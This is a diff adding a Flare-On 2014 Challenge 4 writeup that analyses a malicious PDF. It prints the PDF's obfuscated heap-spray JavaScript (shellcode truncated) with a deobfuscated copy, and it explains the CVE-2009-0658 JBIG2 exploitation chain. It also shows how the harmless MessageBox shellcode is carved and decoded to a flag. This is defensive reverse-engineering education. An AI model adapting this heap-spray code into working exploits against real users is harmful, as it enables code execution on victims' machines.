@@ -5,15 +5,13 @@ description: Writeup of Flare-On 2014.
 tags:
   - Reversing
   - Flare-On
-  - dnSpy
-  - DotNET
 image: images/cover.png
 category: Flare-On Reversing Writeups
 draft: false
 ---
 
-- **Category: DotNET Reversing**
-- **Difficulty: Easy**
+- **Category: Malware Analysis and Reverse Engineering**
+- **Difficulty: Easy*/Medium/Hard*
 - File:- [2014_FLAREOn_Challenges.zip](/uploads/Flare-On_2014/2014_FLAREOn_Challenges.zip)
 
 # Challenge 1 - Bob Doge
@@ -727,3 +725,433 @@ omg i sit almost over?!?
 ```yml
 such.5h311010101@flare-on.com
 ```
+# Challenge 4: 
+
+## Stage 1 Malicious PDF Analysis
+
+### Initial Triage
+
+- File Type: APT9001.pdf: PDF document, version 1.5 
+- Size: 21 KB
+- SHA256: 15f3d918c4781749e3c9f470740485fa01d58fd0b003e2f0be171d80ce3b1c2c
+### Basic Static Analysis
+
+- Detect it Easy show nothing, 
+- I do quick search its hash on VT this is the result,
+
+![Pasted image 20260125231735.png](images/Pasted_image_20260125231735.png)
+
+- 27 out of 65 is pretty high so maybe there is some data which is embedded in PDF.
+
+![Pasted image 20260125231924.png](images/Pasted_image_20260125231924.png)
+
+- So to check that i used `pdfinfo` tool to see metadata of pdf and here is what is got,
+	- It has some js stuff so we can extract it using tool called, [peepdf](https://github.com/jesparza/peepdf).
+
+![Pasted image 20260125232218.png](images/Pasted_image_20260125232218.png)
+### Advance Static Analysis
+
+```bash
+┌──(b14cky㉿DESKTOP-VRSQRAJ)-[~]
+└─$ python2 /opt/peepdf/peepdf.py -fil APT9001.pdf
+
+Warning: PyV8 is not installed!!
+Warning: pylibemu is not installed!!
+Warning: Python Imaging Library (PIL) is not installed!!
+
+File: APT9001.pdf
+MD5: f2bf6b87b5ab15a1889bddbe0be0903f
+SHA1: 58c93841ee644a5d2f5062bb755c6b9477ec6c0b
+SHA256: 15f3d918c4781749e3c9f470740485fa01d58fd0b003e2f0be171d80ce3b1c2c
+Size: 21284 bytes
+Version: 1.5
+Binary: True
+Linearized: False
+Encrypted: False
+Updates: 0
+Objects: 8
+Streams: 2
+URIs: 0
+Comments: 0
+Errors: 1
+
+Version 0:
+        Catalog: 1
+        Info: No
+        Objects (8): [1, 2, 3, 4, 5, 6, 7, 8]
+                Errors (1): [8]
+        Streams (2): [6, 8]
+                Encoded (2): [6, 8]
+                Decoding errors (1): [8]
+        Objects with JS code (1): [6]
+        Suspicious elements:
+                /OpenAction (1): [1]
+                /JS (1): [5]
+                /JavaScript (1): [5]
+                Adobe JBIG2Decode Heap Corruption (CVE-2009-0658): [8]
+```
+
+- I tried to extract the JS code using `extract js > extracted.js` which appeared to be successful.
+- Also this is mind, **"Adobe JBIG2Decode Heap Corruption (CVE-2009-0658)"**
+
+```js
+PPDF> extract js
+
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+var HdPN = "";
+var zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf = "";
+var IxTUQnOvHg = unescape("%u72f9%u4649%u1.....u5740%ud0ff");
+var MPBPtdcBjTlpvyTYkSwgkrWhXL = "";
+
+for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA = 128; EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA >= 0; --EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) MPBPtdcBjTlpvyTYkSwgkrWhXL += unescape("%ub32f%u3791");
+ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv = MPBPtdcBjTlpvyTYkSwgkrWhXL + IxTUQnOvHg;
+OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY = unescape("%ub32f%u3791");
+fJWhwERSDZtaZXlhcREfhZjCCVqFAPS = 20;
+fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA = fJWhwERSDZtaZXlhcREfhZjCCVqFAPS + ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length
+while (OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length < fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA) OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY += OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;
+UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
+MOysyGgYplwyZzNdETHwkru = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length - fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
+while (MOysyGgYplwyZzNdETHwkru.length + fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA < 0x40000) MOysyGgYplwyZzNdETHwkru = MOysyGgYplwyZzNdETHwkru + MOysyGgYplwyZzNdETHwkru + UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;
+DPwxazRhwbQGu = new Array();
+for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA = 0; EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA < 100; EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = MOysyGgYplwyZzNdETHwkru + ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;
+
+for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA = 142; EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA >= 0; --EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += unescape("%ub550%u0166");
+bGtvKT = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length + 20
+while (zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length < bGtvKT) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
+Juphd = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, bGtvKT);
+QCZabMzxQiD = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length - bGtvKT);
+while (QCZabMzxQiD.length + bGtvKT < 0x40000) QCZabMzxQiD = QCZabMzxQiD + QCZabMzxQiD + Juphd;
+FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE = new Array();
+for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA = 0; EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA < 125; EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
+```
+
+- But this looks obfuscated and very messy so I cleaned it,
+
+```js
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+var string_variable_2 = "";
+var string_variable_4 = unescape("%u72f9%u4649%u152....5740%ud0ff");
+var string_variable_1 = "";
+
+for (counter_variable = 128; counter_variable >= 0; --counter_variable) string_variable_1 += unescape("%ub32f%u3791");
+string_variable_3 = string_variable_1 + string_variable_4;
+string_variable_5 = unescape("%ub32f%u3791");
+
+
+while (string_variable_5.length < 790) string_variable_5 += string_variable_5;
+
+substring1_of_str5 = string_variable_5.substring(0, 790);
+substring2_of_str5 = string_variable_5.substring(0, string_variable_5.length - 790);
+
+while (substring2_of_str5.length + 790 < 262144) substring2_of_str5 = substring2_of_str5 + substring2_of_str5 + substring1_of_str5;
+another_array_variable = new Array();
+
+for (counter_variable = 0; counter_variable < 100; counter_variable++) 
+	another_array_variable[counter_variable] = substring2_of_str5 + string_variable_3;
+
+for (counter_variable = 142; counter_variable >= 0; --counter_variable) 
+	string_variable_2 += unescape("%ub550%u0166");
+
+len_str2_plus20 = string_variable_2.length + 20
+
+while (string_variable_2.length < len_str2_plus20) string_variable_2 += string_variable_2;
+
+substring1_of_str2 = string_variable_2.substring(0, len_str2_plus20);
+substring2_of_str2 = string_variable_2.substring(0, string_variable_2.length - len_str2_plus20);
+
+while (substring2_of_str2.length + len_str2_plus20 < 262144) substring2_of_str2 = substring2_of_str2 + substring2_of_str2 + substring1_of_str2;
+array_variable = new Array();
+
+for (counter_variable = 0; counter_variable < 125; counter_variable++) array_variable[counter_variable] = substring2_of_str2 + string_variable_2;
+```
+
+- But you might be confused that how this code will executed because it is in PDF right?
+- So here comes the interesting thing,
+	- CVE-2009-0658 is a heap corruption vulnerability in Adobe Reader’s JBIG2Decode filter.  
+	- A malformed JBIG2 image causes memory overwrite in native code.   
+	- JavaScript heap spray is used beforehand to populate predictable heap memory with shellcode.  
+	- When the corrupted pointer is dereferenced, execution jumps into the sprayed heap region, leading to arbitrary code execution.
+	- One of the first **PDF + JS + native bug** chains
+- So in short, if any user open this code in vulnerable Adobe Reader then this code will execute. 
+#### Code Explanation  
+
+- **It hides malicious code**
+    - The long `%uXXXX%uXXXX` data is hidden machine code / shellcode.
+    - `unescape()` converts it into real binary data.
+- **It creates a lot of useless repeated data**
+    - Repeated patterns are added again and again.
+    - This fills large parts of computer memory.
+- **It mixes junk + malicious code**
+    - So memory looks like:
+        `junk junk junk → malicious code`
+- **It puts this data many times into memory**
+    - Hundreds of copies are created.
+    - This is called **heap spraying**.
+- **Why it does this**
+    - Later, when Adobe Reader crashes due to a bug,  
+        the program may jump to a random memory address.
+    - Because memory is full of attacker data,  
+        it lands on the malicious code.
+
+#### Carving Next Stage
+
+- After some code reading and research i found that `string_variable_4` is the var which has next stage shellcode but it is encoded in some format in js so i did research and this is what i found,
+- The `unescape()` function replaces any escape sequence with the character that it represents. Specifically, it replaces any escape sequence of the form `%XX` or `%uXXXX` (where `X` represents one hexadecimal digit) with the character that has the hexadecimal value `XX`/`XXXX`. If the escape sequence is not a valid escape sequence (for example, if `%` is followed by one or no hex digit), it is left as-is.
+
+![Pasted image 20260125234050.png](images/Pasted_image_20260125234050.png)
+
+- So to decode this i used cyberchef, and we have to convert the endianness because it is being written in heap so we will swap it by `word length of 8`. 
+- We will save this as `shellcode.bin`
+
+![Pasted image 20260125233857.png](images/Pasted_image_20260125233857.png)
+
+- CyberChef Recipe,
+
+```json
+[
+  { "op": "Find / Replace",
+    "args": [{ "option": "Simple string", "string": "%u" }, "", true, false, true, false] },
+  { "op": "Swap endianness",
+    "args": ["Hex", 2, true] },
+  { "op": "From Hex",
+    "args": ["Auto"],
+    "disabled": true }
+]
+```
+## Stage 2 Analyzing Shellcode 
+
+### Initial Triage
+
+- File Type: data
+- Size: 1 KB
+- SHA256: 71d7690eaab011871f8e957c354e96baa16ed14ddcf719caf0776917b5eebe2d
+### Basic Static Analysis
+
+- I quickly check VT for this hash and only 1 out of 54 which means this can be obfuscated and some spoofy things,
+
+![Pasted image 20260125234637.png](images/Pasted_image_20260125234637.png)
+
+- For simplicity i used tool [flare-floss](https://github.com/mandiant/flare-floss) for intelligent string analysis and here is what i found,
+
+```bash
+┌──(b14cky㉿DESKTOP-VRSQRAJ)-[~]
+└─$ /opt/floss shellcode.bin --format sc32
+
+INFO: floss: extracting static strings
+finding decoding function features: 100%|█████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 126.37 functions/s, skipped 0 library functions]
+INFO: floss.stackstrings: extracting stackstrings from 1 functions
+INFO: floss.results: LoadLibraryA
+INFO: floss.results: user32
+INFO: floss.results: MessageBoxA
+INFO: floss.results: OWNED!!!
+INFO: floss.results: 2OWNED!!!
+INFO: floss.results: OWNE
+INFO: floss.results: ExitProcessb
+extracting stackstrings: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 28.02 functions/s]
+INFO: floss.tightstrings: extracting tightstrings from 0 functions...
+extracting tightstrings: 0 functions [00:00, ? functions/s]
+INFO: floss.string_decoder: decoding strings
+decoding strings: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 85.55 functions/s]
+INFO: floss: finished execution after 7.19 seconds
+INFO: floss: rendering results
+
+
+FLARE FLOSS RESULTS (version v3.1.1-0-g3cd3ee6)
+
+.
+.
+.
+
+ ───────────────────────────
+  FLOSS STATIC STRINGS (31)
+ ───────────────────────────
+
++----------------------------------+
+| FLOSS STATIC STRINGS: ASCII (31) |
++----------------------------------+
+
+rIF%
+xsq}
+$~|C
+.
+.
+.
+hess
+hProchExitT
+T$@W
+
+
++------------------------------------+
+| FLOSS STATIC STRINGS: UTF-16LE (0) |
++------------------------------------+
+
+
+ ─────────────────────────
+  FLOSS STACK STRINGS (7)
+ ─────────────────────────
+
+LoadLibraryA
+user32
+MessageBoxA
+OWNED!!!
+2OWNED!!!
+OWNE
+ExitProcessb
+
+ ─────────────────────────
+  FLOSS TIGHT STRINGS (0)
+ ─────────────────────────
+ ───────────────────────────
+  FLOSS DECODED STRINGS (0)
+```
+
+- There are some interesting stack strings, 
+	- `LoadLibraryA` : loads required Windows DLLs at runtime
+	- `MessageBoxA` : displays a message box (proof of code execution)
+	- `ExitProcess` : - cleanly terminates the program after execution
+- And some string so we will look that later,
+### Advance Static Analysis
+
+- To analyze this shellcode, i can use `cutter` so i simply paste shellcode in `cutter` and analyze the assembly,
+
+![Pasted image 20260125235540.png](images/Pasted_image_20260125235540.png)
+
+- In this disassembler, there are 2 functions, `fcn.00000000` and `fcn.0000035e`,
+- `fcn.00000000` looks very large and messy,
+
+![Pasted image 20260125235749.png](images/Pasted_image_20260125235749.png)
+
+- I analyze some part of `fcn.00000000` and i found that it is loading some strings in stack for some purpose as we discuss earlier,
+
+![[Learning/DFIR & MARE/Reverse Engineering/Flare-On/2014/images/Pasted image 20260118140837.png]]
+
+- So i look at the `fcn.0000035e` function and i found that,
+	- It is **building encrypted data on the stack and decrypting it in place using XOR**, so the real strings only exist in memory at runtime.
+
+![Pasted image 20260126001620.png](images/Pasted_image_20260126001620.png)
+
+- Here is the script that do whole decryption and transformation of hex and convert it to ascii,
+
+```py
+# XOR operations
+xor_pairs = [
+    (0x32fba316, 0x32bece79),
+    (0x48cf45ae, 0x2be12bc1),
+    (0xd29f3610, 0xfffa4471),
+    (0x0ca9a9f7, 0x60cfe984),
+    (0x43a993be, 0x3798a3d2),
+    (0x3b628a82, 0x4b11a4ef),
+    (0xccc047d6, 0xffa469be),
+    (0x3154caa3, 0x5265abd4)
+]
+
+# Calculate XOR results
+xor_results = [val1 ^ val2 for val1, val2 in xor_pairs]
+print("XOR Results:", [f"0x{r:08x}" for r in xor_results])
+
+# Combine into single hex string
+combined_hex = ''.join([f"{result:08x}" for result in xor_results])
+print(f"Combined: {combined_hex}")
+
+# Convert to bytes and reverse
+hex_bytes = bytes.fromhex(combined_hex)
+reversed_bytes = hex_bytes[::-1]
+
+# Convert to ASCII
+output = reversed_bytes.decode('ascii', errors='replace')
+print(f"Output: {output}")
+```
+
+```bash
+┌──(b14cky㉿DESKTOP-VRSQRAJ)-[~/]
+└─$ python decr.py
+
+XOR Results: ['0x00456d6f', '0x632e6e6f', '0x2d657261', '0x6c664073', '0x7431306c', '0x70732e6d', '0x33642e68', '0x63316177']
+Combined: 00456d6f632e6e6f2d6572616c6640737431306c70732e6d33642e6863316177
+Output: wa1ch.d3m.spl01ts@flare-on.comE
+```
+
+- Here is the flag using static method,
+
+```yml
+wa1ch.d3m.spl01ts@flare-on.com
+```
+### Advance Dynamic Analysis
+
+```asm
+0x00000359      call    fcn.0000035e ; fcn.0000035e ;  fcn.0000035e(int64_t arg1)
+fcn.0000035e(int64_t arg1);
+; arg int64_t arg1 @ rdi
+; var int64_t var_65h @ stack - 0x65
+; var int64_t var_48h @ stack - 0x48
+; var int64_t var_40h @ stack - 0x40
+0x0000035e      mov     edx, dword [rsp]
+0x00000361      xor     dword [rdx + 0xb], 0x32fba316
+0x00000368      push    0x32bece79
+0x0000036d      xor     dword [rdx + 0x17], 0x48cf45ae
+0x00000374      push    0x2be12bc1
+0x00000379      xor     dword [rdx + 0x23], 0xd29f3610
+0x00000380      push    0xfffffffffffa4471
+0x00000385      xor     dword [rdx + 0x2f], 0xca9a9f7
+0x0000038c      push    0x60cfe984
+0x00000391      xor     dword [rdx + 0x3b], 0x43a993be
+0x00000398      push    0x3798a3d2
+0x0000039d      xor     dword [rdx + 0x47], 0x3b628a82
+0x000003a4      push    0x4b11a4ef
+0x000003a9      xor     dword [rdx + 0x53], 0xccc047d6
+0x000003b0      push    0xffffffffffa469be
+0x000003b5      xor     dword [rdx + 0x5f], 0x3154caa3
+0x000003bc      push    0x5265abd4
+0x000003c1      mov     ecx, esp
+```
+
+- This is how it works,
+- Now you might think that doing XOR first and then push value which is kind of reverse Because,
+	- It happens because **the shellcode modifies its own instructions in memory**.
+	- The values you see in `push 32BECE79` are **encrypted operands**. 
+		- Before that instruction executes, the shellcode does:
+
+```asm
+xor dword ptr [edx+offset], key
+```
+
+- This XOR **rewrites the PUSH instruction itself** in memory.
+- So when execution later reaches that instruction, the CPU fetches **the modified bytes**, not the original ones.
+- That’s why:
+
+```asm
+push 32BECE79 → becomes → push 00456D6F
+```
+
+![Pasted image 20260126012407.png](images/Pasted_image_20260126012407.png)
+
+![Pasted image 20260118140837.png](images/Pasted_image_20260118140837.png)
+#### Flag Extraction
+
+- By putting breakpoint on `004013C1` we can see that `esp` is point to out flag so i do follow in dump for `esp` and i got the flag.
+
+```asm
+004013C1 | 8BCC                     | mov ecx,esp                             
+```
+
+![Pasted image 20260118140846.png](images/Pasted_image_20260118140846.png)
+
+- Alon with flag we get those strings also which we got using floss, which are used to prompt a message box with some random text,
+
+```
+0019FF1C   77 61 31 63 68 2E 64 33 6D 2E 73 70 6C 30 31 74  wa1ch.d3m.spl01t
+0019FF2C   73 40 66 6C 61 72 65 2D 6F 6E 2E 63 6F 6D 45 00  s@flare-on.comE
+0019FF3C   5E 13 40 00 4F 57 4E 45 44 21 21 21 00 00 00 00  ^.@.OWNED
+0019FF4C   4D 65 73 73 61 67 65 42 6F 78 41 00 75 73 65 72  MessageBoxA.
+0019FF5C   33 32 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41  32..LoadLibraryA
+```
+
+- Here is out Flag, 😗 
+
+```yml
+wa1ch.d3m.spl01ts@flare-on.com
+```
+
+![Pasted image 20260126013350.png](images/Pasted_image_20260126013350.png)
